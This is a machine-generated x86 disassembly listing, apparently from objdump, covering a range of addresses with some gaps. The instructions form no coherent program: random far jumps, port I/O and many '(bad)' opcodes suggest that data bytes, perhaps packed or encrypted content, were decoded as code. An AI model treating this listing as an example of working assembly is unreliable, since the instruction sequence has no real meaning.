  415e08:	or     eax,DWORD PTR ss:[edi+0x61dc3594]
  415e0f:	mov    bl,0x7c
  415e11:	pushf  
  415e12:	xor    al,0x90
  415e14:	jmp    0x60c2:0x9a0b6f9f
  415e1b:	pop    edx
  415e1c:	daa    
  415e1d:	cs iret 
  415e1f:	inc    edx
  415e20:	in     al,dx
  415e21:	adc    ch,ch
  415e23:	call   0x6f914d11
  415e28:	adc    DWORD PTR [edx-0x7],0xffffff81
  415e2c:	ja     0x415dee
  415e2e:	or     ebx,edx
  415e30:	fadd   QWORD PTR [eax+0x69]
  415e33:	js     0x415e59
  415e35:	stos   BYTE PTR es:[edi],al
  415e36:	cmp    al,0x41
  415e38:	call   0x577e4741
  415e3d:	shl    DWORD PTR [ebp+0xae1dbb],cl
	...
  415eb3:	add    BYTE PTR [edi],dh
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	arpl   WORD PTR gs:0xf01e1489,ax
  415ec6:	add    BYTE PTR [eax],al
  415ec8:	test   BYTE PTR [eax],0x0
  415ecb:	add    BYTE PTR [eax],al
  415ecd:	out    dx,eax
  415ece:	daa    
  415ecf:	push   ecx
  415ed0:	test   DWORD PTR [esi],esi
  415ed2:	ror    BYTE PTR [ecx],cl
  415ed4:	mov    ebp,0x22a433cf
  415ed9:	fnsave [edi-0x19]
  415edc:	mov    ds,WORD PTR ds:0x78d3c9ca
  415ee2:	sub    cl,al
  415ee4:	cwde   
  415ee5:	adc    bh,BYTE PTR [ebx]
  415ee7:	sti    
  415ee8:	mov    ds:0x6c172a1d,eax
  415eed:	cwde   
  415eee:	retf   
  415eef:	jle    0x415e9f
  415ef1:	fmul   DWORD PTR [bx+di]
  415ef4:	iret   
  415ef5:	rol    BYTE PTR [eax+0x2106041f],1
  415efb:	pop    ebx
  415efc:	ins    BYTE PTR es:[edi],dx
  415efd:	xor    BYTE PTR ds:0xd8603c9f,dl
  415f03:	sti    
  415f04:	jg     0x415eaf
  415f06:	jno    0x415f54
  415f08:	enter  0xe3d1,0x54
  415f0c:	xor    eax,ebx
  415f0e:	mov    bl,0xe7
  415f10:	ret    
  415f11:	inc    edx
  415f12:	std    
  415f13:	jg     0x415f2e
  415f15:	push   eax
  415f16:	ins    DWORD PTR es:[edi],dx
  415f17:	rcl    BYTE PTR [esi+0x41fda0d1],1
  415f1d:	(bad)  
  415f1f:	mov    fs,WORD PTR [edi-0x58]
  415f22:	sub    DWORD PTR [edx+0x74],ebp
  415f25:	mov    WORD PTR [esi-0x24],ss
  415f28:	leave  
  415f29:	aad    0x52
  415f2b:	jmp    0x2d43:0xfcc3e9ff
  415f32:	push   ebp
  415f33:	retf   0xc151
  415f36:	out    dx,al
  415f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f38:	out    dx,al
  415f39:	test   al,0x90
  415f3b:	inc    ebx
  415f3c:	cmp    eax,0xd2b639d8
  415f41:	mov    ebx,0x1113df45
  415f46:	xlat   BYTE PTR ds:[ebx]
  415f47:	mov    edx,0x644afde8
  415f4c:	sbb    bl,BYTE PTR [edi+0x9c0ba44]
  415f52:	ja     0x415fa6
  415f54:	sbb    ebx,DWORD PTR [eax]
  415f56:	arpl   dx,cx
  415f58:	(bad)  
  415f59:	std    
  415f5a:	mov    ch,0x9f
  415f5c:	xchg   esi,eax
  415f5d:	adc    al,0x7
  415f5f:	pop    edx
  415f60:	inc    edx
  415f61:	aam    0xb9
  415f63:	fst    DWORD PTR [edx]
  415f65:	mov    edi,0x494b67ee
  415f6a:	sbb    esi,edi
  415f6c:	popa   
  415f6d:	push   es
  415f6e:	es out 0x75,eax
  415f71:	inc    ebp
  415f72:	xor    ebx,DWORD PTR [ebx-0x24]
  415f75:	cmp    BYTE PTR [eax+0x49fa7d91],ch
  415f7b:	out    0xdd,eax
  415f7d:	shr    BYTE PTR [ebp+0x4630d06c],cl
  415f83:	mov    dl,0xcc
  415f85:	mov    al,0xef
  415f87:	cmp    ebp,esp
  415f89:	inc    edi
  415f8a:	inc    edi
  415f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f8c:	rcr    DWORD PTR [ebx+0x4e24c45c],0x82
  415f93:	sbb    edx,0x1f
  415f96:	loop   0x415f2d
  415f98:	dec    esp
  415f99:	sub    edi,esp
  415f9b:	pop    ecx
  415f9c:	cmp    esi,esi
  415f9e:	test   al,0x12
  415fa0:	xor    al,0x49
  415fa2:	mov    al,ds:0x59ea32bb
  415fa7:	popa   
  415fa8:	scas   eax,DWORD PTR es:[edi]
  415fa9:	in     al,0x41
  415fab:	mov    ds:0x17ac1321,eax
  415fb0:	jo     0x416030
  415fb2:	sub    ch,BYTE PTR [edx+ecx*1-0x4b0d3912]
  415fb9:	xchg   edx,eax
  415fba:	and    dh,BYTE PTR [ecx]
  415fbc:	(bad)  
  415fbe:	xchg   esi,eax
  415fbf:	pop    esi
  415fc0:	arpl   WORD PTR [ebx],bp
	...
  416032:	add    BYTE PTR [eax],al
  416034:	jnp    0x416038
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   edi,DWORD PTR [ecx+0x144fcea9],0xfffffff1
  416046:	add    BYTE PTR [eax],al
  416048:	test   BYTE PTR [eax],0x0
  41604b:	add    BYTE PTR [edx+0x2c],dh
  41604e:	mov    BYTE PTR [ecx+eax*2+0x5b],ah
  416052:	inc    eax
  416053:	clc    
  416054:	dec    edx
  416055:	data16 sti 
  416057:	ret    0xaf9
  41605a:	les    edx,FWORD PTR [edx]
  41605c:	push   ebx
  41605d:	pushf  
  41605e:	push   ds
  41605f:	inc    ecx
  416060:	sub    cl,BYTE PTR [esi+0x60]
  416063:	push   esi
  416064:	push   es
  416065:	add    bl,cl
  416067:	inc    esp
  416068:	inc    ebx
  416069:	add    BYTE PTR [edx+0x40],0x3a
  41606d:	xchg   ecx,eax
  41606e:	lahf   
  41606f:	mov    al,ds:0x94ccc037
  416074:	sbb    edx,ebp
  416076:	(bad)  
  416077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416078:	push   esi
  416079:	out    0xf1,al
  41607b:	sub    al,0x94
  41607d:	(bad)  
  41607e:	pop    ss
  41607f:	dec    ecx
  416080:	jle    0x4160ce
  416082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416083:	jbe    0x416086
  416085:	gs dec edi
  416087:	outs   dx,DWORD PTR ds:[si]
  416089:	push   edx
  41608a:	xor    bh,BYTE PTR [ebx-0x7e70c5f4]
  416090:	sbb    ch,BYTE PTR [esi+0x7af0cecf]
  416096:	jge    0x4160bd
  416098:	and    BYTE PTR [ebx+0x1e],0x61
  41609c:	nop
  41609d:	dec    ecx
  41609e:	rol    BYTE PTR [edx+0x54d746e1],0x76
  4160a5:	mov    cl,0xd9
  4160a7:	dec    ecx
  4160a8:	bound  eax,QWORD PTR [edi-0xf0c982c]
  4160ae:	pop    es
  4160af:	not    DWORD PTR [ebp-0x5c]
  4160b2:	lahf   
  4160b3:	inc    esp
  4160b4:	loop   0x4160c0
  4160b6:	jo     0x416064
  4160b8:	adc    BYTE PTR [ebp+0x6e],0x6c
  4160bc:	cmp    DWORD PTR [edi-0x2dc328e2],ecx
  4160c2:	repz sar DWORD PTR [esi+0x7f5a4b1],1
  4160c9:	jo     0x4160ac
  4160cb:	inc    ecx
  4160cc:	sub    DWORD PTR [ecx+eax*8+0x4eab66ac],edi
  4160d3:	adc    eax,ebx
  4160d5:	retf   
  4160d6:	push   ecx
  4160d7:	mov    eax,0x8ca53930
  4160dc:	jg     0x4160d5
  4160de:	mov    eax,0x557a00f5
  4160e3:	xor    eax,DWORD PTR [edi+edx*1-0x101af8d0]
  4160ea:	fisttp QWORD PTR [edx]
  4160ec:	inc    esi
  4160ed:	lods   eax,DWORD PTR ds:[esi]
  4160ee:	pop    ebp
  4160ef:	clc    
  4160f0:	pop    esp
  4160f1:	dec    edi
  4160f2:	pop    es
  4160f3:	fcomp  DWORD PTR [ebp+0x46e13426]
  4160f9:	outs   dx,DWORD PTR ds:[si]
  4160fb:	or     al,0x3e
  4160fd:	add    eax,0x9b7829fd
  416102:	push   edx
  416103:	inc    ecx
  416104:	vandnpd ymm0,ymm4,YMMWORD PTR [ecx+0xf312997]
  41610c:	jmp    0x3b24e673
  416111:	cmp    al,0x78
  416113:	cld    
  416114:	leave  
  416115:	mov    cl,0xb2
  416117:	pop    eax
  416118:	fucom  st(1)
  41611a:	mov    bl,0x80
  41611c:	sti    
  41611d:	enter  0x5bfd,0x7d
  416121:	ror    BYTE PTR [edi-0x36],cl
  416124:	dec    esi
  416125:	addr16 xchg ecx,eax
  416127:	dec    edi
  416128:	dec    esp
  416129:	cmp    ch,BYTE PTR [edi]
  41612b:	xchg   eax,ecx
  41612d:	and    al,0x30
  41612f:	sub    BYTE PTR [esi+edx*4],ch
  416132:	sub    BYTE PTR [esi+0x9b5f6eb],ah
  416138:	aam    0x52
  41613a:	and    BYTE PTR [ecx],ah
  41613c:	xchg   ebx,eax
  41613d:	push   cs
  41613e:	xor    eax,0x146b02
	...
  4161b3:	add    BYTE PTR [edi+edx*4],ch
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    esi,DWORD PTR [eax]
  4161c1:	sub    DWORD PTR [edx],ebp
  4161c3:	fisttp QWORD PTR [edx]
  4161c5:	repnz add BYTE PTR [eax],al
  4161c8:	test   BYTE PTR [eax],0x0
  4161cb:	add    BYTE PTR [ebx+0x13e7ace3],dh
  4161d1:	mov    dh,BYTE PTR ds:0x2699f72f
  4161d7:	out    dx,eax
  4161d8:	(bad)  
  4161d9:	(bad)  
  4161da:	out    dx,eax
  4161db:	mov    dl,0x80
  4161dd:	pop    eax
  4161de:	dec    edx
  4161e0:	rol    ebx,0xf5
  4161e3:	cmp    al,0xbf
  4161e5:	out    0xc7,al
  4161e7:	fild   QWORD PTR [ecx+0x6b0b6ece]
  4161ed:	(bad)  
  4161ee:	out    dx,eax
  4161ef:	sbb    eax,0xed4834fb
  4161f4:	pop    ebx
  4161f5:	mov    al,0x77
  4161f7:	stc    
  4161f8:	mov    esp,0x43854556
  4161fd:	push   ebp
  4161fe:	cs in  al,0x13
  416201:	call   0x879f:0xe64d5350
  416208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416209:	pop    eax
  41620a:	pop    es
  41620b:	aas    
  41620c:	or     edx,esp
  41620e:	xchg   ecx,eax
  41620f:	cdq    
  416210:	adc    eax,0xb218c554
  416215:	pop    ss
  416216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416217:	rcl    BYTE PTR [ecx+0x52597b9],1
  41621d:	inc    esi
  41621e:	add    al,0x3c
  416220:	sti    
  416221:	inc    ebx
  416222:	pop    edx
  416223:	mov    ebx,0xcd96a747
  416228:	adc    eax,0x34a1f757
  41622d:	jg     0x4161c8
  41622f:	loop   0x41629f
  416231:	and    al,0xdf
  416233:	mul    DWORD PTR [edi]
  416235:	out    0x43,al
  416237:	add    eax,0x9261a4e6
  41623c:	clc    
  41623d:	scas   eax,DWORD PTR es:[edi]
  41623e:	ret    0xd3b0
  416241:	sti    
  416242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416243:	mov    dl,0xcc
  416245:	inc    esp
  416246:	cmp    ebx,DWORD PTR [ecx+0x2068b1a5]
  41624c:	dec    edx
  41624d:	neg    bh
  41624f:	and    ecx,DWORD PTR ds:0x1cbbd769
  416255:	loope  0x41627d
  416257:	hlt    
  416258:	aam    0x18
  41625a:	clc    
  41625b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41625c:	stos   BYTE PTR es:[edi],al
  41625d:	es test eax,0xfb8fbba1
  416263:	fnstsw WORD PTR [edx]
  416265:	aam    0x7b
  416267:	fnsave [edi+0x6e76b88f]
  41626d:	ror    edi,cl
  41626f:	lods   eax,DWORD PTR ds:[esi]
  416270:	xchg   DWORD PTR [eax+0x6f],ebx
  416273:	sub    al,0x77
  416275:	push   es
  416276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416277:	dec    BYTE PTR [ecx-0x25]
  41627a:	in     eax,dx
  41627b:	mov    DWORD PTR [esi],0x8ef675f6
  416281:	mov    esi,DWORD PTR [esi-0x4d266fa]
  416287:	mov    edx,0x293e5b18
  41628c:	xlat   BYTE PTR ds:[ebx]
  41628d:	enter  0x7906,0xe3
  416291:	fdiv   QWORD PTR [edx+ebp*4+0x23894bcc]
  416298:	std    
  416299:	add    BYTE PTR [ebx+0x22],cl
  41629c:	xchg   edi,eax
  41629d:	dec    esi
  41629e:	dec    ebp
  41629f:	jmp    0x41630b
  4162a1:	outs   dx,DWORD PTR ds:[esi]
  4162a2:	ret    0x8c61
  4162a5:	out    0xd0,al
  4162a7:	hlt    
  4162a8:	loop   0x416247
  4162aa:	mov    bh,0xb5
  4162ac:	aaa    
  4162ad:	fcom   QWORD PTR [ebx]
  4162af:	sub    eax,0x4cb3ace5
  4162b4:	rcl    DWORD PTR [esi+0x16f83c4e],0xed
  4162bb:	fucomp st(0)
  4162bd:	push   ebx
  4162be:	lahf   
  4162bf:	dec    edi
  4162c0:	xchg   ebp,eax
  4162c1:	xlat   BYTE PTR ds:[ebx]
	...
  416332:	add    BYTE PTR [eax],al
  416334:	ins    DWORD PTR es:[edi],dx
  416335:	lock repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	(bad)  [ebx+ebx*2]
  416342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416343:	dec    edi
  416344:	add    bl,dh
  416346:	add    BYTE PTR [eax],al
  416348:	test   BYTE PTR [eax],0x0
  41634b:	add    BYTE PTR [ecx-0x2cb83a9c],dh
  416351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416352:	sub    esi,edx
  416354:	cmp    DWORD PTR [eax],0x5b
  416357:	dec    ecx
  416358:	mov    dl,0xf4
  41635a:	aad    0xbf
  41635c:	frstor [esi-0x5]
  41635f:	sub    DWORD PTR [ecx],0xffffff88
  416362:	pop    edi
  416363:	pop    es
  416364:	out    0x10,eax
  416366:	or     eax,0xcf1a3388
  41636b:	aad    0x83
  41636d:	mov    gs:0x91d5fd21,eax
  416373:	mov    bh,0xbf
  416375:	mov    ds:0xd5b423b,al
  41637a:	mov    dh,BYTE PTR [esi+0x31]
  41637d:	loopne 0x416322
  41637f:	push   cs
  416380:	dec    esp
  416381:	xchg   DWORD PTR [ebx-0x4d00e84e],edi
  416387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416388:	scas   eax,DWORD PTR es:[edi]
  416389:	mov    ebp,0x945ccd71
  41638e:	jg     0x41636c
  416390:	ret    
  416391:	mov    cs,WORD PTR [edi-0x7e]
  416394:	push   eax
  416395:	sar    bl,1
  416397:	cmp    ebx,DWORD PTR [edi]
  416399:	fiadd  DWORD PTR [ebx]
  41639b:	and    BYTE PTR [esi-0x6704ee22],cl
  4163a1:	add    ebx,eax
  4163a3:	mov    ?,esp
  4163a5:	push   0x48db3304
  4163aa:	mov    ds:0x52c3a9e9,eax
  4163af:	cs rcr bh,cl
  4163b2:	or     eax,0x59361089
  4163b7:	rcr    BYTE PTR [esi-0x5f226b7f],cl
  4163bd:	inc    eax
  4163be:	sbb    esi,DWORD PTR [bx+0xae2]
  4163c3:	cdq    
  4163c4:	popa   
  4163c5:	idiv   DWORD PTR [ebx+0x4b]
  4163c8:	push   ds
  4163c9:	dec    dh
  4163cb:	push   ds
  4163cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163cd:	xchg   edx,eax
  4163ce:	cld    
  4163cf:	xchg   ecx,eax
  4163d0:	xor    DWORD PTR [esp+edx*1-0x7bcc65f1],esi
  4163d7:	xchg   esp,eax
  4163d8:	sbb    BYTE PTR [edx],ch
  4163da:	daa    
  4163db:	mov    ebp,DWORD PTR [eax-0x30425c4f]
  4163e1:	pop    esi
  4163e2:	lahf   
  4163e3:	add    eax,0x7e80f73
  4163e8:	push   es
  4163e9:	mov    dl,0x81
  4163eb:	jge    0x416386
  4163ed:	pop    esi
  4163ee:	xor    esi,DWORD PTR [eax+0x395c505d]
  4163f4:	ret    0xa60a
  4163f7:	sbb    esi,edx
  4163f9:	xor    BYTE PTR [edi],al
  4163fb:	adc    dl,ch
  4163fd:	gs jmpw 0xb355
  416402:	jae    0x41643d
  416404:	imul   esi,DWORD PTR [edx+eiz*2],0xffffffc1
  416408:	in     eax,0x89
  41640a:	outs   dx,BYTE PTR ds:[esi]
  41640b:	mov    dh,0x4d
  41640d:	call   0xebbc:0x4e94ea3
  416414:	inc    esp
  416415:	test   DWORD PTR [ebp+0x4648c84f],ecx
  41641b:	test   al,cl
  41641d:	and    eax,0xf961a58
  416422:	mov    bl,0xfb
  416424:	es scas eax,DWORD PTR es:[edi]
  416426:	adc    esp,DWORD PTR [eax+0xe]
  416429:	mov    ah,0xc7
  41642b:	int    0x70
  41642d:	inc    ebp
  41642e:	xor    al,BYTE PTR [edi]
  416430:	xchg   edx,eax
  416431:	sub    al,0xb4
  416433:	aas    
  416434:	repz loopne 0x416449
  416437:	sbb    eax,0x800797ec
  41643c:	and    DWORD PTR [ebx+edi*1-0x33],eax
  416440:	ja     0x4163ea
	...
  4164b2:	add    BYTE PTR [eax],al
  4164b4:	in     al,0xf0
  4164b6:	sub    DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	sahf   
  4164c1:	and    BYTE PTR [ebp+esi*2-0xa],0xf3
  4164c6:	add    BYTE PTR [eax],al
  4164c8:	test   BYTE PTR [eax],0x0
  4164cb:	add    BYTE PTR [ebx],al
  4164cd:	mov    dl,0x55
  4164cf:	(bad)  
  4164d0:	pop    eax
  4164d1:	(bad)  
  4164d2:	pushf  
  4164d3:	inc    ebp
  4164d4:	stc    
  4164d5:	in     al,0xa
  4164d7:	pop    ebp
  4164d8:	inc    esi
  4164d9:	imul   edx,DWORD PTR es:[edx],0xee7824e7
  4164e0:	pop    edx
  4164e1:	and    esp,DWORD PTR [edx]
  4164e3:	inc    esi
  4164e4:	fwait
  4164e5:	rcr    DWORD PTR [edi+edi*4-0x3c3ba9dd],1
  4164ec:	or     BYTE PTR [ecx+0x50],cl
  4164ef:	push   es
  4164f0:	mov    ds:0xa06c86f4,al
  4164f5:	(bad)  
  4164f6:	jnp    0x4164eb
  4164f8:	stos   DWORD PTR es:[edi],eax
  4164f9:	in     eax,dx
  4164fa:	jmp    0x84709673
  4164ff:	sub    al,0x29
  416501:	jmp    0x4e504ab8
  416506:	shl    esp,cl
  416508:	shl    DWORD PTR [esp+ebx*8],1
  41650b:	in     eax,0x8c
  41650d:	sub    BYTE PTR [edi+0x6f92bbbc],bh
  416513:	test   BYTE PTR [ebp-0x1d725c1d],dh
  416519:	sub    eax,0x3c45f841
  41651e:	repz inc edi
  416520:	xchg   dl,cl
  416522:	mov    esi,DWORD PTR [ecx-0x5e9bcab3]
  416528:	xchg   DWORD PTR [edi-0x7f],ecx
  41652b:	adc    bl,0xe8
  41652e:	inc    ebp
  41652f:	inc    eax
  416530:	dec    esp
  416531:	stc    
  416532:	add    al,0x43
  416534:	enter  0x5250,0xef
  416538:	sbb    dh,dh
  41653a:	add    bh,bh
  41653c:	int3   
  41653d:	and    ecx,edx
  41653f:	aam    0x25
  416541:	pushf  
  416542:	xlat   BYTE PTR ds:[ebx]
  416543:	je     0x416587
  416545:	mov    esp,0xa646de67
  41654a:	ins    DWORD PTR es:[edi],dx
  41654b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41654c:	or     edi,DWORD PTR [ebx-0x31003959]
  416552:	xor    ecx,DWORD PTR [ebp+edi*2-0x46]
  416556:	inc    eax
  416557:	aaa    
  416558:	xlat   BYTE PTR ds:[ebx]
  416559:	pop    edx
  41655a:	in     al,0xc6
  41655c:	pop    es
  41655d:	test   BYTE PTR [ebp-0x1a554a3b],ah
  416563:	xchg   esi,eax
  416564:	add    edx,edi
  416566:	into   
  416567:	retf   
  416568:	das    
  416569:	call   0x578:0xe677e593
  416570:	jmp    0x8fb8e221
  416575:	jg     0x4165d9
  416577:	cmp    eax,0xf2c61744
  41657c:	add    eax,edx
  41657e:	push   esp
  41657f:	push   ss
  416580:	and    ecx,eax
  416582:	fnstenv [ebx-0x4f]
  416585:	inc    edx
  416586:	je     0x4165c5
  416588:	sub    eax,0xf27486bb
  41658d:	mov    eax,ds:0xbcbdaba5
  416592:	ja     0x416529
  416594:	fild   DWORD PTR [edx-0x66]
  416597:	clc    
  416598:	jle    0x4165f0
  41659a:	mov    al,ds:0x5abdc7e8
  41659f:	mov    eax,ds:0x78bf7abd
  4165a4:	mov    esp,0x5d247c4e
  4165a9:	dec    edi
  4165aa:	pop    es
  4165ab:	stc    
  4165ac:	ins    BYTE PTR es:[edi],dx
  4165ad:	mov    dh,0x4b
  4165af:	mov    eax,0xe65e4b87
  4165b4:	cmp    ecx,eax
  4165b6:	mov    esp,0xbed74ca7
  4165bb:	push   ss
  4165bc:	fiadd  WORD PTR [esi+0xf567d85]
	...
  416632:	add    BYTE PTR [eax],al
  416634:	ins    DWORD PTR es:[edi],dx
  416635:	call   0xbafd:0x67ff45bc
  41663c:	retf   
  41663d:	sbb    ah,dh
  41663f:	aad    0x11
  416641:	int3   
  416642:	repnz pop ecx
  416644:	in     al,dx
  416645:	hlt    
  416646:	add    BYTE PTR [eax],al
  416648:	test   BYTE PTR [eax],0x0
  41664b:	add    BYTE PTR [esi],ah
  41664d:	data16 cmc 
  41664f:	mov    dl,0x17
  416651:	mov    dl,0xa4
  416653:	inc    eax
  416654:	adc    esi,DWORD PTR [edx+eax*2-0x64]
  416658:	imul   esp,ebx,0x7234e1e3
  41665e:	scas   eax,DWORD PTR es:[edi]
  41665f:	iret   
  416660:	sub    DWORD PTR [eax],ebx
  416662:	(bad)  
  416663:	push   esi
  416664:	mov    cl,0xcd
  416666:	mov    dh,0xb6
  416668:	jnp    0x4166a0
  41666a:	xchg   ecx,eax
  41666b:	retf   0xd107
  41666e:	aam    0xf0
  416670:	(bad)  
  416671:	(bad)  
  416672:	and    al,0xd
  416674:	test   DWORD PTR [esi+ecx*4],edi
  416677:	pop    edi
  416678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416679:	(bad)  
  41667a:	pop    ebp
  41667b:	shl    BYTE PTR [edx],1
  41667d:	cmp    bh,BYTE PTR [eax+esi*4-0x7386cf89]
  416684:	loope  0x416702
  416686:	cmp    BYTE PTR [ecx+edi*8],bh
  416689:	arpl   WORD PTR [esi-0x518282f2],ax
  41668f:	push   ss
  416690:	xor    DWORD PTR [eax-0x23],esp
  416693:	add    eax,0xdf589484
  416698:	fwait
  416699:	loop   0x4166a4
  41669b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41669c:	cli    
  41669d:	out    0x46,eax
  41669f:	add    al,0xf8
  4166a1:	(bad)  
  4166a3:	push   edx
  4166a4:	popf   
  4166a5:	aad    0xca
  4166a7:	add    eax,0x2d506344
  4166ac:	push   0x88b45a3a
  4166b1:	int3   
  4166b2:	or     bh,bh
  4166b4:	or     DWORD PTR [edi],edi
  4166b6:	cld    
  4166b7:	test   eax,0xc2b74cbe
  4166bc:	xchg   BYTE PTR [edi-0x79],dl
  4166bf:	sub    DWORD PTR [edi-0x27946b1d],eax
  4166c5:	lds    ebp,FWORD PTR [eax]
  4166c7:	pop    ebx
  4166c8:	or     ebp,ecx
  4166ca:	aam    0x6e
  4166cc:	push   esi
  4166cd:	pop    ebx
  4166ce:	mov    cl,0xa
  4166d0:	test   al,0x5f
  4166d2:	jl     0x4166f7
  4166d4:	test   DWORD PTR [esi-0x268d92f2],ebp
  4166da:	or     al,0xb6
  4166dc:	add    dh,bh
  4166de:	out    dx,eax
  4166df:	shl    BYTE PTR [eax+0x3a],cl
  4166e2:	rcr    DWORD PTR [edx+0x7dd29b4f],1
  4166e8:	mov    ds:0x153749f8,eax
  4166ed:	inc    edi
  4166ee:	sub    DWORD PTR [edi+0x29],ecx
  4166f1:	out    dx,al
  4166f2:	mov    cl,0x4a
  4166f4:	rol    DWORD PTR [esi+0x1f1ff3ae],0x5d
  4166fb:	push   cs
  4166fc:	adc    esi,edi
  4166fe:	xor    DWORD PTR [ecx],edi
  416700:	adc    edi,0x40ce4ade
  416706:	mov    ch,0xec
  416708:	bound  edx,QWORD PTR [esi+ebx*4+0x78]
  41670c:	adc    edi,DWORD PTR [ebp-0x56b17c05]
  416712:	(bad)  
  416713:	mov    ds,ecx
  416715:	xchg   esi,eax
  416716:	adc    eax,0xc9c284d6
  41671b:	lea    eax,[eax+0x32a6b61f]
  416721:	(bad)  
  416722:	sahf   
  416723:	xchg   sp,ax
  416725:	mov    ah,0xb1
  416727:	cli    
  416728:	lock (bad) 
  41672a:	bound  ebp,QWORD PTR [ecx+0xea60f8f]
  416730:	mov    dl,0x39
  416732:	adc    eax,0x7f9089e
  416737:	mov    cl,0x62
  416739:	push   cs
  41673a:	cmp    eax,0x95931cef
  41673f:	(bad)  
  416741:	xor    eax,0x0
	...
  4167b2:	add    BYTE PTR [eax],al
  4167b4:	retf   
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm6,DWORD PTR [eax]
  4167c1:	xrelease xchg DWORD PTR [ecx-0x1e],edx
  4167c5:	cmc    
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	test   BYTE PTR [eax],0x0
  4167cb:	add    BYTE PTR [esi+0x13],ch
  4167ce:	push   DWORD PTR [edi-0x5b43196a]
  4167d4:	popw   es
  4167d6:	sbb    al,0xe6
  4167d8:	stos   BYTE PTR es:[edi],al
  4167d9:	stos   BYTE PTR es:[edi],al
  4167da:	or     DWORD PTR [edi],ebx
  4167dc:	ds mov edi,0xef1902fb
  4167e2:	js     0x41682d
  4167e4:	das    
  4167e5:	std    
  4167e6:	das    
  4167e7:	int    0x33
  4167e9:	aaa    
  4167ea:	shl    ecx,1
  4167ec:	addr16 jae 0x416806
  4167ef:	fstp   TBYTE PTR fs:[eax]
  4167f2:	mov    ah,0xc
  4167f4:	xchg   esi,eax
  4167f5:	test   al,0x83
  4167f7:	xchg   BYTE PTR [edx+0x64],dl
  4167fa:	and    al,0xb0
  4167fc:	sbb    eax,0x1a1d5414
  416801:	xchg   BYTE PTR [eax+0x451c6e69],ah
  416807:	jmp    0x416819
  416809:	mov    ds:0xe421a172,eax
  41680e:	in     al,dx
  41680f:	push   es
  416810:	xchg   ecx,eax
  416811:	cld    
  416812:	and    DWORD PTR [bx+si-0x5a92],esp
  416817:	sti    
  416818:	xlat   BYTE PTR ds:[ebx]
  416819:	bound  ebx,QWORD PTR es:0x5b340386
  416820:	out    dx,al
  416821:	scas   al,BYTE PTR es:[edi]
  416822:	mov    al,ds:0x4afb7076
  416827:	data16 jbe 0x416882
  41682a:	call   DWORD PTR [ebp+edx*8+0x2fad0c0f]
  416831:	add    eax,0xb48bc71c
  416836:	stc    
  416837:	push   ss
  416838:	add    al,0xbc
  41683a:	xchg   ebx,eax
  41683b:	cmp    al,0xb9
  41683d:	stos   DWORD PTR es:[edi],eax
  41683e:	adc    al,0x8c
  416840:	or     dl,BYTE PTR [ecx]
  416842:	leave  
  416843:	(bad)  
  416844:	and    cl,cl
  416846:	mov    eax,0xea77a38f
  41684b:	call   0xcd7efb57
  416850:	lahf   
  416851:	add    esi,ecx
  416853:	push   cs
  416854:	out    dx,al
  416855:	push   esp
  416856:	into   
  416857:	jp     0x4168b5
  416859:	push   0x9b66fd4d
  41685e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41685f:	mov    DWORD PTR [ecx-0x46],ebp
  416862:	mov    gs,edi
  416864:	sbb    al,0xe
  416866:	fcomp  QWORD PTR gs:[esi-0x548e2d8f]
  41686d:	adc    BYTE PTR [eax],dh
  41686f:	jmp    0x41680e
  416871:	stos   DWORD PTR es:[edi],eax
  416872:	dec    edx
  416873:	mov    ds:0x1b8d46ab,eax
  416878:	es daa 
  41687a:	or     DWORD PTR [ebp+0x43],ebx
  41687d:	dec    edi
  41687e:	mov    edi,DWORD PTR [edi]
  416880:	push   ebp
  416881:	pop    ss
  416882:	add    DWORD PTR ds:0x3a190e24,0xffffffc7
  416889:	loope  0x416863
  41688b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41688c:	je     0x41688c
  41688e:	dec    esi
  41688f:	jle    0x416908
  416891:	dec    esp
  416892:	pop    esi
  416893:	mov    esi,0xdb9ff27c
  416898:	(bad)  
  416899:	retf   0xd54c
  41689c:	cmc    
  41689d:	jmp    0x97fe:0x6be9ad0f
  4168a4:	cmp    DWORD PTR [ebp-0x74],0x2ea1b4c3
  4168ab:	(bad)  
  4168ac:	lahf   
  4168ad:	sbb    al,0x1e
  4168b0:	pop    ss
  4168b1:	enter  0x25f4,0x7d
  4168b5:	addr16 mov edx,0x8eec8cf0
  4168bb:	pop    es
  4168bc:	fwait
  4168bd:	into   
  4168be:	popf   
  4168bf:	xchg   edx,eax
  4168c0:	dec    edx
  4168c1:	fadd   DWORD PTR [eax]
	...
  416933:	add    BYTE PTR [ebp-0x78],al
  416936:	sub    al,0x77
